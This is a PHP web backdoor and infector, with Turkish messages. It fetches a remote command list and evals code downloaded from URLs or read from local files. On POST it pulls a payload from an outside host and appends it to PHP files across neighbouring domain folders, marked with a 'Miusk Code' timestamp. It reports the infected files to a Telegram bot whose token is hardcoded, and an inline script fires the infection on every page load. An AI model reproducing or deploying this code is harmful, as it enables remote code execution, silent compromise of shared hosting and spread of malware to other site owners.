
<?php



$commandsUrl = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/komutlar.txt";


function fetchRemoteFile($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    $content = curl_exec($ch);
    
    if (curl_errno($ch)) {
        echo "CURL Hatası: " . curl_error($ch);
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    return $content;
}


$commandsContent = fetchRemoteFile($commandsUrl);
if ($commandsContent === false) {
    echo "Komut dosyası alınamadı.";
    exit();
}


$commands = array_filter(array_map('trim', explode("\n", $commandsContent)));


$documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
$currentFilePath = str_replace($documentRoot, '', realpath(__FILE__));


if (!empty($_SERVER['QUERY_STRING'])) {
    $currentUrl = $_SERVER['REQUEST_URI'];
    $newUrl = $currentFilePath . '?' . $_SERVER['QUERY_STRING'];
    if ($newUrl !== $currentUrl) {
        header("Location: $newUrl");
        exit();
    }
}


foreach ($commands as $line) {
    $parts = explode(" ", $line, 2);
    if (count($parts) < 2) continue;

    [$param, $defaultUrl] = $parts;

    if (isset($_GET[$param])) {
        $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
        $fileContent = '';


        if (filter_var($input, FILTER_VALIDATE_URL)) {
            $fileContent = fetchRemoteFile($input);
        } else {
            $filePath = $documentRoot . '/' . ltrim($input, '/');
            if (file_exists($filePath) && is_readable($filePath)) {
                $fileContent = file_get_contents($filePath);
            } else {
                echo "Dosya bulunamadı veya okunamıyor: " . htmlspecialchars($filePath);
                exit();
            }
        }


        if ($fileContent !== false) {
            try {
                eval('?>' . $fileContent);
            } catch (Throwable $e) {
                echo "Kod çalıştırma hatası: " . $e->getMessage();
            }
        } else {
            echo "Dosya içeriği alınamadı.";
        }
        exit();
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $payloadUrl = 'https://sub1.erospro.net/test1/t10.txt';

    $logMode = isset($_GET['logke']);
    $payload = file_get_contents($payloadUrl);
    if (!$payload) {
        echo json_encode(['status' => 'error', 'message' => 'Payload indirilemedi.']);
        exit;
    }

    function findDomains_v1($startDir)
    {
        $currentDir = realpath($startDir);
        $domains = [];

        while ($currentDir !== '/') {
            $entries = scandir($currentDir);

            foreach ($entries as $entry) {
                if ($entry === '.' || $entry === '..') {
                    continue;
                }

                $entryPath = $currentDir . DIRECTORY_SEPARATOR . $entry;

                if (is_dir($entryPath) && preg_match('/^[a-zA-Z0-9\-.]+$/', $entry)) {
                    $domains[] = $entryPath;
                }
            }

            $currentDir = dirname($currentDir);
        }

        return array_unique($domains);
    }

    function scanAndProcessInDomains($domains, $payload, $targetFiles, &$updatedFiles)
    {
        $results = [];
        foreach ($domains as $domainDir) {
            $results = array_merge($results, scanAndProcess($domainDir, $payload, $targetFiles, $updatedFiles));
        }
        return $results;
    }

    function adjustPhpTags($fileContents, $payload)
    {
        $utcTimestamp = gmdate('Y-m-d H:i:s');
        $MiuskCode = "<!-- Miusk Code: $utcTimestamp -->\n$payload";

        if (preg_match('/<\?php/', $fileContents)) {
            if (!preg_match('/\?>\s*$/', $fileContents)) {
                $fileContents .= "\n?>";
            }
        } else {
            $fileContents = "<?php\n" . $fileContents;
        }

        return $fileContents . "\n\n" . $MiuskCode;
    }

    function sendTelegramNotification($updatedFiles)
    {
        $botToken = '7288530056:AAH3mvjU3wl94AivFXbX2XWH4Oug6c74gy8';
        $chatId = '-1002427387838';

        $message = "Güncellenen dosyalar:\n";
        foreach ($updatedFiles as $filePath) {
            $message .= "- $filePath\n";
        }
        $message .= "Sayfa URL: " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        

        $message = urlencode($message);


        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
    }

    function scanAndProcess($directory, $payload, $targetFiles, &$updatedFiles)
    {
        $files = scandir($directory);
        $results = [];
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }

            $filePath = $directory . DIRECTORY_SEPARATOR . $file;

            try {
                if (is_dir($filePath)) {
                    $results = array_merge($results, scanAndProcess($filePath, $payload, $targetFiles, $updatedFiles));
                } elseif (in_array(basename($filePath), $targetFiles)) {
                    $fileContents = @file_get_contents($filePath);

                    if ($fileContents === false) {
                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Dosya okunamadı.'];
                        continue;
                    }

                    if (preg_match('/<!-- Miusk Code: (.*?) -->/', $fileContents, $matches)) {
                        $lastUpdate = strtotime($matches[1]);
                        $currentUtc = time();

                        if (($currentUtc - $lastUpdate) < 36000) {
                            $results[] = ['file' => $filePath, 'status' => 'skipped', 'message' => 'Kod zaten güncel.'];
                            continue;
                        }

                        $fileContents = preg_replace('/\n\n<!-- Miusk Code.*$/s', '', $fileContents);
                    }

                    $adjustedContents = adjustPhpTags($fileContents, $payload);
                    if (@file_put_contents($filePath, $adjustedContents)) {
                        $updatedFiles[] = $filePath;
                        $results[] = ['file' => $filePath, 'status' => 'success', 'message' => 'Kod başarıyla eklendi.'];
                    } else {
                        $results[] = ['file' => $filePath, 'status' => 'error', 'message' => 'Kod eklenemedi.'];
                    }
                }
            } catch (Exception $e) {
                $results[] = ['file' => $filePath, 'status' => 'error', 'message' => $e->getMessage()];
            }
        }
        return $results;
    }

    $startDir = __DIR__;
    $targetFiles = ['test2.php', 'test3.php'];
    $domains = findDomains_v1($startDir);

    $updatedFiles = [];
    $results = scanAndProcessInDomains($domains, $payload, $targetFiles, $updatedFiles);

    if (!empty($updatedFiles)) {
        sendTelegramNotification($updatedFiles);
    }

    echo json_encode($results);
    exit;
}


?>


<script>
window.addEventListener('load', function () {
    if (!window.started) { 
        window.started = true;

        fetch(window.location.href, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        })
        .then(response => response.json())
        .then(data => {
            data.forEach(result => {
                const statusColor = result.status === 'success' ? 'green' : result.status === 'error' ? 'red' : 'orange';
            });
        })
        .catch(error => console.error("Hata:", error));
    }
});
</script>
